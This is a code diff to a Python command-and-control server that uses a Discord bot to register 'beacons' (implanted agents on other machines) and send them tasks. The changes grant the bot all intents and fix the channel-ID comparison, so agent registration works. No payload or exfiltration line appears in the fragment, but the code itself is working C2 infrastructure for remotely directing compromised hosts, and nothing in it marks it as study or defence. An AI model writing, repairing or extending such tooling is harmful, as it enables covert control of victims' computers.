@@ -14,17 +14,16 @@ from threading import Thread
 
 # Discord bot token
 DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
-COMMAND_CHANNEL_ID = os.getenv('COMMAND_CHANNEL_ID')  # Replace with your channel ID where you'll send tasks
+CHANNEL_ID = int(os.getenv('COMMAND_CHANNEL_ID'))
 
 # Global dictionary to store beacon sessions
 beacons = {}
 
-intents = discord.Intents.default()
+intents = discord.Intents.all()
 intents.messages = True
 intents.message_content = True
 
 client = discord.Client(intents=intents)
-
 
 def importModule(modName, modType):
     """
@@ -115,6 +114,7 @@ def taskLoop(beaconId, channel):
         # Sleep to avoid constant polling
         sleep(config.C2_BLOCK_TIME / 100)
 
+
 @client.event
 async def on_ready():
     print(f'Logged in as {client.user}')
@@ -125,7 +125,7 @@ async def on_message(message):
     Triggered when the bot receives a message.
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
-    if message.channel.id == COMMAND_CHANNEL_ID:
+    if message.channel.id == CHANNEL_ID:
         if message.content.startswith("[+] Registering new agent AGENT:"):
             beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
             print(f"New agent registered: {beaconId}")
